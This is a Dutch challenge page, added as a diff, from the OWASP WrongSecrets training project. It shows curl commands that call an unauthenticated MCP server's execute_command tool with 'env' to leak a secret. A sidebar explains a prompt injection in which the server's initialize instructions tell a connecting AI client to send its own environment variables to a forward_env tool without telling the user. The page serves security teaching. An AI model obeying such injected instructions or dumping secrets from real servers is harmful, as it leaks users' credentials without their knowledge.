@@ -1,0 +1,71 @@
+=== Blootstelling van omgevingsvariabelen in een MCP-server
+
+Het Model Context Protocol (MCP), ontwikkeld door Anthropic, is een open standaard waarmee AI-assistenten verbinding kunnen maken met tools en gegevensbronnen. Hoewel MCP krachtige integraties mogelijk maakt, vormen slecht beveiligde MCP-servers een aanzienlijk beveiligingsrisico: ze kunnen gevoelige secrets die in omgevingsvariabelen staan blootstellen aan iedereen die erbij kan.
+
+Deze uitdaging demonstreert een realistisch scenario waarin een developer een MCP-server heeft gedeployd met een `execute_command`-tool. Dit type tool komt vaak voor in MCP-servers die AI-assistenten shelltoegang geven — maar het kan worden misbruikt door iedereen die het endpoint ontdekt.
+
+**Je doel:**
+
+1. **Er draait een MCP-server op een aparte poort (8090)**, gescheiden van de hoofdapplicatie
+2. **De server biedt een `execute_command`-tool** die de omgevingsvariabelen van het proces teruggeeft
+3. **Een geheim (`WRONGSECRETS_MCP_SECRET`) is opgeslagen als omgevingsvariabele** in de draaiende container
+4. **De MCP-server heeft geen authenticatie** — iedereen die poort 8090 kan bereiken, kan zijn tools aanroepen
+
+**Hoe je met de MCP-server communiceert:**
+
+Ontdek eerst de beschikbare tools:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+[%collapsible, title="wanneer je werkt vanaf www.wrongsecrets.com"]
+====
+
+[source,bash]
+----
+curl -s -X POST https://www.wrongsecrets.com/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+====
+
+
+Roep vervolgens de `execute_command`-tool op om de omgevingsvariabelen op te halen en het geheim te vinden:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+
+[%collapsible, title="wanneer je werkt vanaf www.wrongsecrets.com"]
+====
+
+[source,bash]
+----
+curl -s -X POST https://www.wrongsecrets.com/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+====
+
+
+****
+🤖 *Leuk weetje — MCP Prompt Injection ("MCP Rug Pull"):*
+
+Deze MCP-server gaat een stap verder dan alleen het blootstellen van env-vars aan passieve aanroepers. Het embedt ook kwaadaardige instructies in zijn `initialize`-antwoord (het veld `instructions`). Wanneer een legitieme AI-assistent met deze server verbindt, worden die instructies stilzwijgend in de systeemprompt van het model geïnjecteerd. Het model wordt verteld om onmiddellijk `execute_command` met `env` aan te roepen en het resultaat daarna door te sturen naar de tool `forward_env` — waarbij de *eigen omgevingsvariabelen van de AI-client* terug naar de server worden gestuurd — zonder de gebruiker ooit te informeren.
+
+Je kunt dit lokaal proberen door het volgende te doen:
+
+1. draai de container lokaal (bijv. `docker run -p 8080:8080 -p 8090:8090 ghcr.io/owasp/wrongsecrets/wrongsecrets-pr:pr-2400-7391231`)
+2. zet een agent op met de mcp-server "http://localhost:8090/mcp" (of "https://www.wrongsecrets.com/mcp" als het je niet uitmaakt dat er online gelekt wordt)
+3. initialiseer de agent en bekijk de logs van je container met de melding "MCP forward_env received exfiltrated client env data (XXX chars)", wat laat zien dat de MCP-server je env-vars heeft ontvangen.
+
+Dit staat bekend als de *MCP rug pull* of *MCP supply chain attack*, en het laat zien waarom je altijd het veld `instructions` van elke MCP-server waarmee je verbindt moet controleren voordat je die vertrouwt. Zorg er daarnaast altijd voor dat je alleen geïsoleerde processen zonder toegang tot secrets toestaat om MCP-servers te gebruiken. Roep MCP-servers nooit rechtstreeks vanuit je terminal aan als er gevoelige ENV-vars of bestanden aanwezig zijn.
+****
